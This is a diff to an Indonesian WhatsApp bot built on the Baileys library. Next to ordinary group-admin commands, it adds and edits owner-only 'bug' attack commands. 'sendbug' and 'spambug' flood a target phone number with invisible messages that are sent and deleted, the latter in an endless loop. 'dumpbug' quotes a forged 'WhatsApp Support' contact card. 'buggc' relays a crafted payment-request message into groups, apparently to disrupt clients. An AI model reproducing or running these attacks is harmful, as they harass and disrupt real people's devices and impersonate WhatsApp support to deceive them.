@@ -34,7 +34,10 @@ const isDev = nomorDeveloper.includes(senderNumber) || isSaya
 const isOwner = nomorOwner.includes(senderNumber) || isSaya
 const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
 const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
+//©from: ivan
 const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
+//©from: andik
+const contactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
 
 const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
 const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
@@ -58,10 +61,12 @@ if (!isGroup && body && !msg.key.fromMe && !isDev) {
 semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : wa.me/${senderNumber}`})}
 
 switch (command) {
+//©from: dennis
 case 'cek': case 'test': case 'status':
 exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
 break
 
+//©from: dennis
 case 'groupsetting':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
@@ -71,6 +76,7 @@ if (dn === 'open'){ await semar.groupSettingUpdate(from, 'not_announcement')
 } else if (dn === 'close'){ await semar.groupSettingUpdate(from, 'announcement')} else { reply('Error')}
 break
 
+//©from: dennis
 case 'add':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
@@ -80,6 +86,7 @@ add = msg.message.extendedTextMessage.contextInfo.participant
 await semar.groupParticipantsUpdate(from, [add], "add")
 break
 
+//©from: dennis
 case 'kick':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
@@ -89,6 +96,7 @@ remove = msg.message.extendedTextMessage.contextInfo.participant
 await semar.groupParticipantsUpdate(from, [remove], "remove")
 break
 
+//©from: dennis
 case 'promote':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
@@ -99,6 +107,7 @@ await semar.groupParticipantsUpdate(from, [promote], "promote")
 reply('Done!')
 break
 
+//©from: dennis
 case 'demote':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
@@ -109,10 +118,10 @@ await semar.groupParticipantsUpdate(from, [demote], "demote")
 reply('Done!')
 break
 
+//©from: dennis × ivan
 case 'sendbug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
-if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
@@ -123,29 +132,52 @@ if (Number(nd[1]) >= 5000) return reply('Jumlah terlalu banyak!')
 if (!Number(nd[1])) return reply('Jumlah harus berupa angka!')
 for (let i = 0; i < nd[1]; i++){
 await sleep(5000)
-let bug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "‎" })
+let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "‎" })
 await sleep(1000)
-semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: bug.key })}
+semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
 reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
-break	
+break
 
+//©from: dennis × ivan
 case 'spambug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}spambug ${senderNumber}`)
-if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 async function infiniteSpam(i) { 
-let spam = await semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" })
+let spambug = await semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" })
 await sleep(1000)
-semar.sendMessage(`${dn}@s.whatsapp.net`, { delete: spam.key })
+semar.sendMessage(`${dn}@s.whatsapp.net`, { delete: spambug.key })
 infiniteSpam(++i)}
 infiniteSpam(1)
 reply(`Sukses spam bug ke nomor ${dn}`)
-break	
+break
 
+//©from: dennis × andik
+case 'dumpbug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
+if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
+if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
+let dumpbug = await semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
+await sleep(1000)
+semar.sendMessage(`${dn}@s.whatsapp.net`, { delete: dumpbug.key })
+reply(`Sukses mengirim bug ke nomor ${dn}`)
+break
+
+//©from: dennis x haikal
+case 'buggc':
+if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
+semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+break
+
+//©from: dennis
 case 'autobug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
@@ -155,30 +187,28 @@ reply('Sukses')
 reply('Sukses')} else { reply('Error')}
 break
 
-case 'buggc':
-if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
-requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
-semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
-break
-
+//©from: dennis x baileys
 case '01':
 sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
 break
 
+//©from: dennis x baileys
 case '02':
 sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
 break
 
+//©from: dennis x baileys
 case '03':
 sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
 break
 
+//©from: dennis
 case 'restart':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
 break
 
+//©from: dennis
 case 'shutdown':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
